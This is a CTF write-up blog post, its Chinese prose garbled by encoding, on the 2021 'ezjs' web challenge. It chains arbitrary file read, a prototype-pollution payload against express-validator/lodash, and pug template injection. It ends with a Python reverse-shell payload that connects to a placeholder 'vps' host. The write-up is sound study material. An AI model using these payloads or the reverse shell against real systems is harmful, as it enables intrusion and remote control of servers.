---

title: 2021å·…å³°æå®¢ä¸€é“é¢˜â€”â€”ezjs
comments: true
hide: false
date: 2021-08-03 13:59:30
urlname: 2021dfjk
updated:
password:
tags: åŸå‹é“¾æ±¡æŸ“
categories: Write-Up
---



æ·±å…¥å­¦ä¹ ä¸€ä¸‹JavaScriptçš„åŸå‹é“¾æ±¡æŸ“æ¼æ´

<!-- more -->

æˆ‘æ˜¯å·…å³°fwï¼Œå°±æ‘¸å‡ºæ¥ä¸€é“é¢˜ç›®ï¼Œå¥½å¥½å­¦ä¹ ä¸‹åŸå‹é“¾æ±¡æŸ“ã€‚ä»¥ä¸‹ä¸ºåšé¢˜è§†è§’ã€‚

## Web-ezjs

### ç¬¬ä¸€æ­¥ - ä»»æ„æ–‡ä»¶è¯»å–

æ‰“å¼€é¢˜ç›®å‘ç°éå¸¸ç®€æ´çš„ç™»é™†ï¼Œä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œéšä¾¿è¾“å…¥ä»¥ä¸‹å‘ç°ç›´æ¥è¿›å…¥äº†ã€‚

ç™»é™†é™åˆ¶usernameå’Œpasswordå¤§äº5ä½

![image-20210803151950579](2021dfjk/image-20210803151950579.png)

å›¾ç‰‡æ˜¾ç¤ºè¿™å—æ˜æ˜¾æœ‰å¼‚å¸¸ï¼Œå¯¹åº”GETè¯·æ±‚çš„newingå‚æ•°

![image-20210803142727224](2021dfjk/image-20210803142727224.png)

#### å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–

![image-20210803142841282](2021dfjk/image-20210803142841282.png)

åˆ©ç”¨æ­¤å¤„è¯»å–äº†éƒ¨åˆ†æºç å¦‚ä¸‹

`/app/routes/index.js`

```javascript
var express = require('express');
var router = express.Router();
var {body, validationResult} = require('express-validator');
var crypto = require('crypto');
var fs = require('fs');
var validator = [
  body('*').trim(),
  body('username').if(body('username').exists()).isLength({min: 5})
  .withMessage("username is too short"),
  body('password').if(body('password').exists()).isLength({min: 5})
  .withMessage("password is too short"),(req, res, next) => {
        const errors = validationResult(req)
        if (!errors.isEmpty()) {
      return res.status(400).render('msg', {title: 'error', msg: errors.array()[0].msg});
        }
        next()
    }
];
router.use(validator);

router.get('/', function(req, res, next) {
  return res.render('index', {title: "ç™»å½•ç•Œé¢"});
});

router.post('/login', function(req, res, next) {
  let username = req.body.username;
  let password = req.body.password;
  if (username !== undefined && password !== undefined) {
    if (username == "admin" && password === crypto.randomBytes(32).toString('hex')) {
      req.session.username = "admin";
    } else if (username != "admin"){
      req.session.username = username;
      
    } else {
      return res.render('msg',{title: 'error', msg: 'admin password error'});
    }
    return res.redirect('/verify');
  }
  return res.render('msg',{title: 'error',msg: 'plz input your username and password'});
});

router.get('/verify', function(req, res, next) {
  console.log(req.session.username);
  if (req.session.username === undefined) {
    return res.render('msg', {title: 'error', msg: 'login first plz'});
  }
  if (req.session.username === "admin") {
    req.session.isadmin = "admin";
  } else {
    req.session.isadmin = "notadmin";
  }
  return res.render('verify', {title: 'success', msg: 'verify success'});
});


router.get('/admin', function(req, res, next) {
  //req.session.debug = true;
  if (req.session.username !== undefined && req.session.isadmin !== undefined) {
    if (req.query.newimg !== undefined) req.session.img = req.query.newimg;
    var imgdata = fs.readFileSync(req.session.img? req.session.img: "./images/1.png");
    var base64data = Buffer.from(imgdata, 'binary').toString('base64');
    var info = {title: 'æˆ‘çš„ç©ºé—´', msg: req.session.username, png: "data:image/png;base64," + base64data, diy: "åå¹´ç£¨ä¸€å‰‘ğŸ˜…v0.0.0(å°šå¤„äºå¼€å‘ç‰ˆ"};

    if (req.session.isadmin !== "notadmin") {
      if (req.session.debug !== undefined && req.session.debug !== false) info.pretty = req.query.p;
      if (req.query.diy !== undefined) req.session.diy = req.query.diy;
      info.diy = req.session.diy ? req.session.diy: "å°Šè´µçš„admin";
      return res.render('admin', info);
    } else {
      return res.render('admin', info);
    }
  } else {
    return res.render('msg', {title: 'error', msg: 'plz login first'});
  }
});
module.exports = router;
```



/app/app.js

```javascript
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var crypto = require('crypto');
var session = require('express-session');
var key = 'session';


var indexRouter = require('./routes/index');
var app = express();
var secrets = crypto.randomBytes(32).toString('hex');
app.use(session({
  name: key,
  secret: secrets,
  store: new sessionStore(),
  saveUninitialized: false,
  resave: false,
  cookie: {
    maxAge: 100 * 60 * 600
  }

}));

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);


// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
```

æœ¬åœ°å®‰è£…ä¸€ä¸‹ç¯å¢ƒ

```json
{
  "dependencies": {
    "cookie-parser": "^1.4.5",
    "crypto": "^1.0.1",
    "express": "^4.17.1",
    "express-session": "^1.17.2",
    "express-validator": "^6.12.1",
    "http-errors": "^1.8.0",
    "morgan": "^1.10.0",
    "path": "^0.12.7",
    "request": "^2.88.2",
    "session-file-store": "^1.5.0"
  }
}
```

### ç¬¬äºŒæ­¥ - ä»£ç å®¡è®¡

æ ¹æ®æºç å¯ä»¥å‘ç°ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä»¥adminèº«ä»½ç™»é™†ï¼Œä½†æ˜¯adminçš„å¯†ç åˆæ˜¯éšæœºä¸å¯èƒ½ç ´è§£çš„

![image-20210803143641462](2021dfjk/image-20210803143641462.png)

è·Ÿåˆ°`/verify`è·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœ`session.username`æ˜¯adminå°±å°†`isadmin`èµ‹å€¼adminï¼Œå¦åˆ™å°±æ˜¯notadmin 

![image-20210803143743000](2021dfjk/image-20210803143743000.png)

å†ç»§ç»­è·Ÿè¿›åˆ°`/admin`è·¯ç”± ï¼Œå‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„æºç ã€‚å…³é”®ç‚¹åœ¨äºä¸‹ä¸€æ­¥ï¼Œå¦‚æœ`isadmin`**åªè¦ä¸æ˜¯**notadminå°±ä¼šæ‰§è¡Œä¸€æ®µæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªç›®æ ‡å°±æ˜¯ä»¤`isadmin`å˜ä¸ºénotadmin

![image-20210803144118578](2021dfjk/image-20210803144118578.png)

adminçš„å¯†ç æ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å‡ºé¢˜äººæ ¹æœ¬ä¸æƒ³è®©æˆ‘ä»¬ç™»é™†è·å¾—adminï¼Œä¹Ÿä¸å¯èƒ½ç™»é™†adminã€‚æ‰€ä»¥å¾—å¦æƒ³æ–¹æ³•ï¼Œæˆ‘ä»¬çš„å…³é”®ç‚¹å°±åœ¨äºè®©`isadmin`ä¸æ˜¯notadminï¼Œè€Œ`isadmin`åˆæ˜¯åœ¨`/verify`è·¯ç”±ä¸‹æ‰åˆ›å»ºçš„ï¼Œå¦‚æœæ”¹å˜åŸå‹å¯¹è±¡çš„å†…å®¹è®©`isadmin`æå‰åˆ›å»ºï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æ±¡æŸ“ï¼Œä»è€Œè®©`isadmin`å˜ä¸ºénotadmin

å›¾ä¸º [@Mrkaixin](www.mrkaixin.top) å¸ˆå‚…ç»™å‡ºçš„sessionæ ·å­

![image-20210803144614812](2021dfjk/image-20210803144614812.png)

### ç¬¬ä¸‰æ­¥ - åŸå‹é“¾æ±¡æŸ“

æ ¹æ®è¯»åˆ°çš„packageåŒ…å¼•ç”¨ï¼Œå‘ç°lodashç‰ˆæœ¬ä¸º4.17.15ã€‚lodash<4.17.17æ˜¯æœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´çš„

![E34B2280959DFF59059010F95FFB5E8C](2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png)

è¿™é‡Œç»™å‡º[å‚è€ƒæ–‡ç« ](https://paper.seebug.org/1426/)å¼•ç”¨éƒ¨åˆ†ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼Œå‚è€ƒæ–‡ç« åœ¨æ–‡æœ«

> æµ‹è¯•æ•°æ®åŒ…ï¼š
>
> ```json
> {"__proto__[test]": "123 "}
> ```
>
> è¿™é‡Œåœ¨segments.reduceå‡½æ•°ä¸­å¯¹è¾“å…¥çš„å€¼è¿›è¡Œäº†ä¸€äº›åˆ¤æ–­å’Œæ›¿æ¢ã€‚é‡è¦çš„ç‚¹å°±æ˜¯å½“ä¼ å…¥çš„é”®ä¸­å­˜åœ¨`.` ï¼Œåˆ™ä¼šåœ¨å­—ç¬¦ä¸¤è¾¹åŠ ä¸Š`[" "]`ï¼Œå¹¶ä¸”æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç»“æœã€‚
>
> æ¥ç€ä¹‹å‰çš„è¿‡ç¨‹ï¼Œåœ¨ç»è¿‡äº†è¿‡æ»¤å™¨çš„å¤„ç†ä¹‹åï¼Œä¼šé€šè¿‡lodash.setå¯¹æŒ‡å®šçš„pathè®¾ç½®æ–°å€¼
>
> ![-w1160](2021dfjk/1607915420000-16044095450346.jpg-w331s)
>
> å°è¯•æ±¡æŸ“**proto**[test]ï¼Œç»“æœå‘ç°æ˜¯æ±¡æŸ“å¹¶æ²¡æœ‰æˆåŠŸï¼ŒåŸå› æ˜¯å› ä¸ºï¼Œå½“lodash.setä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨ä¸€ä¸ªä¸ç¬¬äºŒä¸ªå‚æ•°åŒåçš„é”®æ—¶ï¼Œæ±¡æŸ“å°±ä¼šå¤±è´¥
>
> æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±è¦å°è¯•å»ç»•è¿‡è¿™ä¸ªç‚¹ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¯­å¥ï¼š
>
> ```
> path !== '' ? _.set(req[location], path, newValue) : _.set(req, location, newValue);
> ```
>
> è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»è¯·æ±‚ä¸­ç›´æ¥å–å‡ºæ¥çš„ï¼Œpathæ˜¯ç»è¿‡å…ˆå‰å¤„ç†åçš„å‡ºæ¥çš„å€¼ã€‚æ‰€ä»¥èƒ½ä¸èƒ½é€šè¿‡è¿™ä¸ªå¤„ç†æ¥è¿›è¡Œç»•è¿‡å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚ å½“æˆ‘ä»¬ä¼ å…¥ï¼š
>
> ```
> {"\"].__proto__[\"test":"123 "}
> ```
>
> è¿™é‡Œçš„é”®ä¸º`"].__proto__["test`ï¼Œç”±äºå­—ç¬¦é‡Œé¢å­˜åœ¨`.`ï¼Œæ‰€ä»¥åœ¨segments.reduceå‡½æ•°å¤„ç†æ—¶ä¼šå¯¹å…¶å·¦å³åŠ åŒå¼•å·å’Œä¸­æ‹¬å·ï¼Œæœ€ç»ˆå˜æˆï¼š`[""].__proto__["test"]`ã€‚
>
> è¿™æ—¶å°±ä¸å­˜åœ¨åŒåçš„é”®äº†ï¼Œäºæ˜¯æŸ¥çœ‹æ±¡æŸ“çš„åçš„å€¼å‘ç°ï¼š
>
> ![-w426](2021dfjk/1607915421000-16044107085533.jpg-w331s)
>
> æˆ‘ä»¬è®¾ç½®çš„å€¼å¹¶æ²¡æœ‰ä¼ é€’è¿›å»ï¼Œè€Œæ˜¯æ±¡æŸ“ä¸ºäº†ä¸€ä¸ªç©ºå€¼ã€‚ä¸ºä»€ä¹ˆä¼ é€’è¿›æ¥çš„newValueä¸ºç©ºå€¼å‘¢ï¼Ÿ
>
> ä»select-fields.jsä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å› ä¸ºå–å€¼æ—¶ï¼Œä½¿ç”¨çš„æ˜¯lodash.getæ–¹æ³•ä»`req['body']`ä¸­å–è¢«å¤„ç†åçš„é”®å€¼ï¼Œå¤„ç†åçš„é”®æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å–å‡ºæ¥çš„å€¼å°±ä¸ºundefinedã€‚å½“undefinedä¼ é€’åˆ°Sanitization.runæ–¹æ³•ä¸­åï¼Œç»è¿‡äº†ä¸€ä¸ª`.toString()`çš„å¤„ç†å˜æˆäº†`''`ç©ºå­—ç¬¦ä¸²ã€‚
>
> åˆ©ç”¨lodash.getæ–¹æ³•ä¸­è¯»å–é”®å€¼çš„å¦™ç”¨å¾—åˆ°æœ€ç»ˆçš„payloadï¼š
>
> ```json
> {"a": {"__proto__": {"test": "testvalue"}}, "a\"].__proto__[\"test": 222}
> ```
>
> è¯¦ç»†å¯åœ¨å‚è€ƒæ–‡ç« ä¸­æŸ¥çœ‹

äºæ˜¯è¿›è¡Œæµ‹è¯•

æµ‹è¯•ä»£ç 

```javascript
const express = require('express')
const app = express()

const port = 9001

app.use(express.json())
app.use(express.urlencoded({
    extended: true
}))

const {
    body,
    validationResult
} = require('express-validator')

middlewares = [
    body('*').trim(),
    body('username').if(body('username').exists()).isLength({min: 5})
        .withMessage("username is too short"),
    body('password').if(body('password').exists()).isLength({min: 5})
        .withMessage("password is too short"),(req, res, next) => {
        const errors = validationResult(req)
        if (!errors.isEmpty()) {
            return res.status(400).render('msg', {title: 'error', msg: errors.array()[0].msg});
        }
        next()
    }
]

app.use(middlewares)

app.post("/user", (req, res) => {
    const foo = "hellowrold"
    let username = req.body.username;
    let password = req.body.password;
    console.log(req.body)
    console.log(Object.prototype)
    return res.status(200).send(foo)
})


app.listen(port, () => {
    console.log(`server listening on ${port}`)
})

lod = require('lodash')
lod.setWith({}, "__proto__[isadmin]", "notadmin")
console.log(Object.prototype)
```

æ ¹æ®åŸpayloadï¼Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œç”¨jsonæ ¼å¼postçš„è¯·æ±‚æˆåŠŸè¾¾åˆ°äº†ç›®çš„ï¼Œå¹¶ä¸”è¿˜èƒ½è¿›è¡Œè¦†ç›–

![image-20210803151756631](2021dfjk/image-20210803151756631.png)

ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®æ˜¯ä¸è§£æjsonè¯·æ±‚çš„ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼æ„é€ åŸå‹é“¾æ±¡æŸ“

![image-20210803152057397](2021dfjk/image-20210803152057397.png)

åæ€ï¼šæ¯”èµ›ä¸­ç”±äºæœªä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¯¼è‡´ä»¥ä¸ºå¿…é¡»è¦è¦†ç›–ä¸ºadminæ‰è¡Œï¼Œé”™å¤±äº†å¤§é‡æ—¶é—´ï¼Œå…¶å®åªè¦æ˜¯énotadminå°±è¡Œ

æœ€ç»ˆæµ‹è¯•å¦‚ä¸‹

![image-20210803151332184](2021dfjk/image-20210803151332184.png)

Payload:`".constructor.prototype["xxx` 

åˆ©ç”¨è¿™æ ·çš„æ„é€ å™¨å»è¾¾åˆ°è¦†ç›–`xxx`çš„ç›®çš„ï¼Œ`.__proto__.` è¿™æ ·æ˜¯ä¸è¡Œçš„

![image-20210803152912326](2021dfjk/image-20210803152912326.png)

åŸå‹é“¾æ±¡æŸ“æˆåŠŸ

![image-20210803152818280](2021dfjk/image-20210803152818280.png)

### ç¬¬å››æ­¥ - å‘½ä»¤æ‰§è¡Œ

ç»§ç»­çœ‹ä»£ç ï¼Œå‘ç°`session.debug`åå°†`query`è¯·æ±‚çš„`p`èµ‹åˆ°äº†`info.pretty`é‡Œã€‚

![image-20210803153247822](2021dfjk/image-20210803153247822.png)

---

è¦è¾¾åˆ°pï¼Œé¦–å…ˆè¦è¦†ç›–`session.debug`ï¼Œæ‰€ä»¥ä¸Šä¸€æ­¥æœ€ç»ˆpayloadä¸º

```php
username=112222&password=123456&a".constructor.prototype["isadmin=&a".constructor.prototype["debug=
```

---



åˆ©ç”¨æ–‡ä»¶è¯»å–è¯»åˆ°äº†`/app/view/admin.pug`

```pug
html
  head
    title= title
    meta(http-equiv="Content-Type", content="text/html;charset=UTF-8")
  body

    mixin hello(text)
      p= text
      div #{msg}

    mixin printdiy()
      div ä¸ªæ€§ç­¾åï¼š
        div #{diy}
        div ---#{msg}

    form(action="", method="get")
      div æ›´æ”¹å›¾ç‰‡
        select(name="newimg")
          option(value="./images/1.png") çº¸é£æœº
          option(value="./images/2.png") äºº
          option(value="./images/3.png") å°ç«è½¦
      div ä¸ªæ€§ç­¾å
        input(type="text" name="diy" value="å°Šè´µçš„adminå¯ä»¥åœ¨è¿™æ›´æ”¹ä¸ªæ€§ç­¾å")
      input(type="submit")


    div <img src='#{png}'>
    +hello("å“ˆå–½")
    +printdiy()
```

è€Œpugè¿™é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ŒåŸå› åœ¨pugæ¨¡ç‰ˆå¼•æ“çš„ä¸€ä¸ª[issue](https://github.com/pugjs/pug/issues/3312)ä¸­æåˆ°çš„

payload

```php
./?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('
```

åæ€ï¼šexecæ˜¯ä¸å›æ˜¾çš„ï¼ä¸€ç›´è®©æˆ‘ä»¥ä¸ºæ˜¯æˆ‘æ‰“çš„æ–¹å¼ä¸å¯¹...

æ—¢ç„¶æ²¡å›æ˜¾é‚£è¯•ä¸€ä¸‹å‘ç°æ˜¯é€šå¤–ç½‘çš„ï¼Œå°±å¼¹ä¸ªshellå›æ¥ã€‚è¿™ç®—æ˜¯ä¸ªæ³¨å…¥ï¼Œä¸€æ‰“æ•´ä¸ªç•Œé¢å˜å¾—æƒ¨ä¸å¿ç¹

![image-20210803153836972](2021dfjk/image-20210803153836972.png)

æ™®é€šçš„å¼¹shellå‘½ä»¤ä¼¼ä¹å¹¶ä¸ç®¡ç”¨ï¼Œç›´æ¥å¹²å®ƒ ç”¨pythonå‘½ä»¤å¼¹shell

![image-20210803153955025](2021dfjk/image-20210803153955025.png)

payloadï¼š

```
./?p=');process.mainModule.constructor._load('child_process').exec('python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'vps\',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);"');_=('
```

æˆåŠŸå¼¹åˆ°shellï¼Œè·å¾—flag

![image-20210803154137511](2021dfjk/image-20210803154137511.png)

---

## æ€»ç»“

å·…å³°fwå°±æ˜¯æˆ‘äº†ï¼Œåšé¢˜ç»éªŒè¿˜æ˜¯ä¸è¶³ï¼Œå¯¹äºåŸå‹é“¾æ±¡æŸ“è¿™ä¸€å—çš„çŸ¥è¯†ç»è¿‡è¿™ä¸€æ¬¡æ¯”èµ›çš„æ£€æµ‹å‘ç°è¿˜æ˜¯æœ‰æ‰€æ¬ ç¼ºï¼ŒæŠ“ç´§æ€»ç»“å·©å›ºä¸€ä¸‹jsåŸå‹é“¾æ±¡æŸ“çš„çŸ¥è¯†ç‚¹å§ã€‚

---

## å‚è€ƒèµ„æ–™

[Seebug express-validator 6.6.0 åŸå‹é“¾æ±¡æŸ“åˆ†æ](https://paper.seebug.org/1426/)

[pugæ¨¡ç‰ˆå¼•æ“issue](https://github.com/pugjs/pug/issues/3312)

[@Mrkaixinå¸ˆå‚…](https://www.mrkaixin.top/) éå¸¸æ„Ÿè°¢Mrkaixinå¸ˆå‚…çš„æŒ‡å¯¼

